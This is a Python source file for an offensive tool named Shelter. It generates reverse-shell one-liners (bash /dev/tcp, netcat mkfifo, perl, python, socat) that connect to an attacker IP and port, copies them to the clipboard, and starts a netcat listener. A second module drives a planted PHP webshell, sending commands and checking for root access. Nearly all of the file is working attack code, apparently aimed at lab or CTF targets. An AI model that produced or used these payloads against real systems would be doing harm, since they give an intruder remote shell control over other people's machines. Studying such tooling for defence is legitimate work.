#!/usr/bin/python3.9

import argparse
import pyperclip
import os
import base64
import netifaces
import subprocess
import re
import random
import sys
import requests

if os.name.lower() == "nt":
    aerr("Sorry!!! But this script could be run on Linux only.")
# Defining xterm-256color for usage in the script. Compatible with linux only.
bold = "\033[1m"
green = "\033[32m"
white = "\033[37m"
purple = "\033[95m"
red = "\033[91m"
blue = "\033[34m"
orange = "\033[33m"
end = "\033[0m"

def ap(text) :
    print(f"{bold}{green}[+] {end}{text}")
    #print(bold,green,"[+]",end,text)
def ainfo(text) :
    print(f"{bold}{purple}[*] {end}{text}")
    #print(bold,purple,"[*]",end,text)
def aerr(text) : 
    print(f"{bold}{red}[-] {end}{text}") 
    #print(bold,red,"[-]",end,text)

parser = argparse.ArgumentParser(description=f"""
{bold}{green}
   _____ __         ____           
  / ___// /_  ___  / / /____  _____
  \__ \/ __ \/ _ \/ / __/ _ \/ ___/
 ___/ / / / /  __/ / /_/  __/ /    
/____/_/ /_/\___/_/\__/\___/_/     

{end}{bold}{red}To boldly catch shells even the size of a meteorite.      
{end}{bold}{orange}Version: v1.1.2 - 19/04/21 - Bides Das @Xyan1d3 {end}""",formatter_class=argparse.RawTextHelpFormatter)

subparser = parser.add_subparsers(title="Available Modules", dest="module")
rev = subparser.add_parser("rev",help="Revshell to clipboard")
web = subparser.add_parser("web",help="Webshell interactor")
webrev = subparser.add_parser("webrev",help="Webshell to Revshell")
host = subparser.add_parser("host",help="Copies a revershell file in pwd and hosts it and copies the ip to your clipboard")

rev_sub = rev.add_subparsers(title="Available Payloads",dest='sub',help=False)
bash = rev_sub.add_parser("bash",help="echo base64_encoded_bash-i_payload |base64 -d|bash")
bashi = rev_sub.add_parser("bashi",help="bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1")
bash196 = rev_sub.add_parser("bash196",help="0<&196;exec 196<>/dev/tcp/ATTACKER_IP/ATTACKER_PORT; bash <&196 >&196 2>&196")
bashrl = rev_sub.add_parser("bashrl",help="exec 5<>/dev/tcp/ATTACKER_IP/ATTACKER_PORT;cat <&5 | while read line; do $line 2>&5 >&5; done")
bash5 = rev_sub.add_parser("bash5",help="bash -i 5<> /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0<&5 1>&5 2>&5")
bashudp = rev_sub.add_parser("bashudp",help="bash -i >& /dev/udp/ATTACKER_IP/ATTACKER_PORT 0>&1")
nc_mkfifo = rev_sub.add_parser("nc_mkfifo",help="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ATTACKER_IP ATTACKER_PORT >/tmp/f")
perl = rev_sub.add_parser("perl",help="""perl -e 'use Socket;$i="ATTACKER_IP";$p=ATTACKER_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'""")
py2 = rev_sub.add_parser("py2",help="""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'""")
py = rev_sub.add_parser("py",help="""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'""")
py2export = rev_sub.add_parser("py2export",help="""export RHOST="ATTACKER_IP";export RPORT=ATTACKER_PORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'""")
pyexport = rev_sub.add_parser("pyexport",help="""export RHOST="ATTACKER_IP";export RPORT=ATTACKER_PORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")""")
socat = rev_sub.add_parser("socat",help="socat TCP:ATTACKER_IP:ATTACKER_PORT EXEC:'bash',pty,stderr,setsid,sigint,sane")
#ruby = rev_sub.add_parser("ruby",help="""ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",ATTACKER_PORT).to_i;exec sprintf("bash -i <&'%'d >&'%'d 2>&'%'d",f,f,f)'""")

bash.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
bashi.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
bash196.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
bashrl.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
bash5.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
bashudp.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
nc_mkfifo.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
perl.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
py2.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
py.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
py2export.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
pyexport.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
socat.add_argument("--nohandler",action="store_true",help="Copies only the revshell payload. [Does not start handler]")
bash.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
bashi.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
bash196.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
bashrl.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
bash5.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
bashudp.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
nc_mkfifo.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
perl.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
py2.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
py.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
py2export.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
pyexport.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
socat.add_argument("-i",help="IP for reverse shell.",metavar="127.0.0.1")
bash.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
bashi.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
bash196.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
bashrl.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
bash5.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
bashudp.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
nc_mkfifo.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
perl.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
py2.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
py.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
py2export.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
pyexport.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
socat.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)

web.add_argument("url",help="Target URL [http://127.0.0.1/cmd.php]",metavar="URL")
web.add_argument("-f",help="Filename of the webshell [Default : cmd.php]. Incase you enter only ip in url arg.")
web.add_argument("-p",help="GET parameter to send commands.[Default: cmd]")
web.add_argument("--ssl",help="Force HTTPS",action="store_true")
web.add_argument("--nossl",help="Force downgrade to HTTP",action="store_true")


args = parser.parse_args()

def fetch_ip(): # This function IP of the NIC [default:tun0]
    nic = "tun0"
    if "tun0" not in netifaces.interfaces():
        aerr("No VPN detected...")
        ainfo(f"Enter the Interface you want to listen on from {netifaces.interfaces()}")
        nic = str(input("Interface Name : "))

    ipaddr = []
    for interface in netifaces.interfaces():
        try : 
            for link in netifaces.ifaddresses(interface)[netifaces.AF_INET]:
                ipaddr.append(link['addr'])
        except KeyError:
            ipaddr.append(0)
    ip = ipaddr[netifaces.interfaces().index(nic)]
    if ip == 0 :
        aerr(f"Fatal Error: {nic} has no ip assigned.")
        exit()
    return ip

def fetch_port(): # This function returns a free tcp port for catching reverse shell.
    revshell_ports = [8888,9001,9002,9003,9004,9005,9999,7777,6666,5555,4444] # The ports to use as reverse shell.
    for each in revshell_ports: # This loop will output an empty port which is not being actively used by our attackbox.
        op = subprocess.run(['netstat', '-tul'], stdout=subprocess.PIPE).stdout.decode('utf-8')
        if str(each) in op: # Checks the presence of the port number in the netstat -tul output
            pass
        else:
            return each

def shell_cpy(language,ATTACKER_IP,ATTACKER_PORT): # This function takes attacker ip,attacker port & language og revshell and returns a full fleged reverse-shell
    bashi_b64 = base64.b64encode(f"bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1".encode()).decode()
    
    payloads = {
    "bash" : f"echo {bashi_b64} |base64 -d|bash",
    "bashi" : f"bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1",
    "bash196" : f"0<&196;exec 196<>/dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT}; bash <&196 >&196 2>&196",
    "bashrl" : f"exec 5<>/dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT};cat <&5 | while read line; do $line 2>&5 >&5; done",
    "bash5" : f"bash -i 5<> /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0<&5 1>&5 2>&5",
    "bashudp" : f"bash -i >& /dev/udp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1",
    "nc_mkfifo" : f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ATTACKER_IP} {ATTACKER_PORT} >/tmp/f",
    "perl" : """perl -e 'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'""" % (ATTACKER_IP,ATTACKER_PORT),
    "py2" : f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ATTACKER_IP}",{ATTACKER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'""",
    "py" : f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ATTACKER_IP}",{ATTACKER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'""",
    "py2export" : f"""export RHOST="{ATTACKER_IP}";export RPORT={ATTACKER_PORT};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'""",
    "pyexport" : f"""export RHOST="{ATTACKER_IP}";export RPORT={ATTACKER_PORT};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'""",
    "socat" : f"socat TCP:{ATTACKER_IP}:{ATTACKER_PORT} EXEC:'bash',pty,stderr,setsid,sigint,sane"
    }
    if language == "": # If the language parameter of this function is detected it will fallback to base64'ed bash.
        return payloads["bash"]
    return payloads[language] # Returns reverseshell payload from the dictionary by slapping in ATTACKERIP and ATTACKERPORT.
def Invoke_Webshell(url): # This will invoke a webshell when a url with param is given like http://127.0.0.1/rev.php?cmd=
    try:   # Here it checks wether the site is available or not
        r = requests.get(f"{url}")
        if "404" in r.text or "Not Found" in r.text: # Added check if the named site is not available which returns not found by webserver.
            aerr(f"Fatal Error : 404 Page not found.")
            exit()
    except requests.ConnectionError: # If the site is unavailable it will return an 404.
        aerr(f"Fatal Error : 404 Page not found.")
        exit()
    # We only reach here after the availablity check is complete.
    # This means from here the site is available and we are ready to rock and roll.
    r = requests.get(f"{url}id") # The webshell will issue id and the response isstored in r
    uid = int(re.findall("[0-9]+",r.text)[0]) # We do some regex magic and grad out the uid and gid values seperately.
    user = r.text.rstrip().split("(")[1].split(")")[0] # We take out the the username and primary group name here.
    if "root" in user or uid == 0: # We check for root and then display a colourful messaage.
        ap(f"{red}{bold}root{bold}{purple}@{orange}{url.split('/')[2]}{end}{bold} WebShell opened.{end}")
        ap(f"Wait!! What we are {red}{bold}root{end}")
    else:
        if uid > 0 and uid < 1000 : # We check for the account whether it is a service account. Generally service accounts have a uid gid from greater than 0 and less than 1000
            ap(f"{red}{bold}{user}{bold}{purple}@{orange}{url.split('/')[2]}{end}{bold}[{green}Service Account{end}] WebShell opened{end}.")
            ap("Good Luck!!! Happy Privilege Escation...")
        elif uid > 1000: # We check for the account whether it is a Regular user of the box.
            ap(f"{red}{bold}{user}{bold}{purple}@{orange}{url.split('/')[2]}{end}{bold}[{green}Regular User{end}] WebShell opened{end}.")
            ap("Good Luck!!! Happy Privilege Escation...")
    while True:
        cmd = input(f"{bold}{purple}rev{green}shelter> {end}{bold}{orange}") # Takes input from the user and sends the command to the user.
        if cmd.lower() == "exit" or cmd.lower() == "quit": # Added the function to exit the webshell on entering quit or exit.
            print()
            ainfo("KTHXBYE!")
            exit()
        print(f"{end}",end="")
        r = requests.get(f"{url}{requests.utils.quote(cmd)}") # It will send the url encoded command and url encoded to the url as a GET parameter.
        print(r.text.rstrip()) # We print the response of the command on the screen while removing a extra trailling line sing rstrip.
        
def shell_handler(port,proto): # shell_handler invokes a netcat listener it takes port to listen on and protocol UDP/TCP
    if proto.lower() == "tcp":
        os.system(f"nc -lvnp {fetch_port()}") # Invoking netcat as TCP listener
    elif proto.lower() == "udp":
        os.system(f"nc -luvnp {fetch_port()}") # Invoking netcat with UDP support




if len(sys.argv) == 1: # If no arguments are supplied then the this will print the arg parser help.
    parser.print_help()
try:
    if args.module == "rev": # Checks for 1st pos arg if its rev.
        if args.sub in list(rev_sub.choices.keys()): # Checks if the 2nd pos arg is valid language for revshell payload.
            #if args.i == None and args.p == None:
            #    args.nohandler == True
            if args.i != None: # Checks if IP is supplied via arg and check if it is a valid IP using regex.
                check = bool(re.match("^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$",args.i))
                if not check: # Exits the script of the IP is not valid.
                    aerr(f"Fatal Error : {args.i} is not a valid ipv4 address")
                    exit()
            if args.p != None: # Checks if port is supplied via arg and checks if it is in the valid port range.
                if int(args.p) >= 65535 or int(args.p) < 0:
                    aerr(f"Fatal Error : {args.p} is not a valid port number.")
                    exit()
            if args.i == None: # Using predefined variable to store the ip if not found by args.
                args.i = fetch_ip()
            if args.p == None: # Using predefined variable to store the port if not found by args.
                args.p = fetch_port()
            if args.p == 80 or args.p == 443 :
                port_choice_troll = ["Trying to slip through Firewall, You Naughty ;)","Time to be Sneaky Beaky Like...","Let's be a ghost for now.","Shh!! Firewall is sleeping, Better not wake him up."]
                ap(f"{orange}{bold}{random.choice(port_choice_troll)}{end}")
            payload = shell_cpy(args.sub,args.i,args.p) # It will take 2nd positional args as language and store it in a variable.
            pyperclip.copy(payload) # Will copy the revshell payload into the clipboard.
            
            if not args.nohandler: # It checks if the --nohandler flag not is supplied.
                ap("Starting up Shell Handler...")
                if "udp".lower() in payload.lower(): # Checks if udp is present in the revshell then starts netcat with udp support
                    shell_handler(args.p,"udp") # Invokes netcat listener with UDP support.
                else:
                    shell_handler(args.p,"tcp") # Invokes netcat listener on tcp mode.
            else: # It will take place when --nohandler flag is supplied.
                ainfo("No Handler flag detected. Handler will not be started.")
        else: # If not argument is added after rev then it automatically falls back to bash base64'ed bash revshell.
            ainfo("No Payload specified : Falling back to base64 encoded bash -i revshell")
            ap("Starting up Shell Handler...")
            payload = shell_cpy("bash",fetch_ip(),fetch_port())
            pyperclip.copy(payload)
            shell_handler(fetch_port(),"tcp")


    if args.module == "web":
        if not bool(re.match("^http://|https://",args.url)) and not bool(re.match("^(http://|https://)[a-zA-Z0-9.]+/$",args.url)):
            if args.ssl and args.nossl:
                aerr(f"{bold}{white}A tight slap to you for slapping --ssl & --nossl together.")
                exit()
            elif args.ssl:
                args.url = "https://" + args.url
            elif args.nossl or not args.ssl and not args.nossl:
                args.url = "http://" + args.url
        if bool(re.match("^http://|https://",args.url)): # Checks whether http or https is present in the url entered.
            if bool(re.match("^(http://|https://)[a-zA-Z0-9.]+$",args.url)): # This if regex checks for url like http://127.0.0.1 and makes them http://127.0.0.1/
                args.url += "/"
            if bool(re.match("^(http://|https://)[a-zA-Z0-9.]+/",args.url)): # This if regex checks for url like https://127.0.0.1/ or http://127.0.0.1/
                if bool(re.match("^(http://|https://)[a-zA-Z0-9.]+/$",args.url)): # This regex checks if it has the filename path in the url else it injects cmd.php of the -f parameter.
                    if args.f == None: # Checks for the -f arg for filename if not supplied it puts default cmd.php there.
                        args.url += "cmd.php"
                    elif args.f != None: # If -f arg is supplied it will inject the filename from the parameter and put it in the url.
                        args.url += args.f
                if bool(re.match("^(http://|https://)[a-zA-Z0-9./]+$",args.url)): # Checks if the url has the args parameter present else injects ?cmd= or the data added with -p flag.
                    if args.p == None: # It checks for the -p flag if the parameter is not supplied it on default will add ?cmd= to url.
                        args.url += "?cmd="
                    elif args.p != None: # If the -f flag is supplied it will be injected to the url as a parameter ?arg=
                        args.url += f"?{args.p}="
        # The url is prepared for doing whatever we want to do.
        Invoke_Webshell(args.url)

except KeyboardInterrupt: # The whole program is in the try block with the error handling of ctrl-c and prints the KTHXBYE
    print()
    ainfo("KTHXBYE!") # This message is inspired from earlier version of https://github.com/byt3bl33d3r/CrackMapExec